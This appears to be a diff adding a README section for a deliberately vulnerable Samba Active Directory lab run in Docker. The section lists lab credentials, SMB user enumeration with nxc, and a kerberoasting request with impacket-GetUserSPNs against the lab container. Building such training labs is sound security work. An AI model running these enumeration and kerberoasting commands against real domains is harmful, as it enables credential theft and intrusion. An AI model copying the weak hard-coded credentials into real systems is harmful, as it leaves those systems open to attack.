@@ -460,6 +460,17 @@ vulhub down           # stop the last one
 vulhub update         # git pull new scenarios
 ```
 
+### `dlab up samba-ad`
+Vulnerable **Active Directory in Docker** (real Samba DC: LDAP/Kerberos/SMB). See its README for creds.
+```bash
+dlab up samba-ad      # build + run the DC (LAB.LOCAL, Administrator:Password123!)
+IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' lab-samba-ad)
+addhost $IP dc01.lab.local lab.local
+nxc smb $IP -u alice -p 'Spring2024!' --users
+impacket-GetUserSPNs -dc-ip $IP LAB.LOCAL/alice:'Spring2024!' -request   # kerberoast
+```
+Users: alice, bob, jdoe, svc_sql(SPN), svc_web(SPN), asrepuser. Attack cmds: `cheat ad`.
+
 ### `adlab`
 Guide for setting up an Active Directory lab (GOAD / Ludus — VM-based, not Docker).
 ```bash
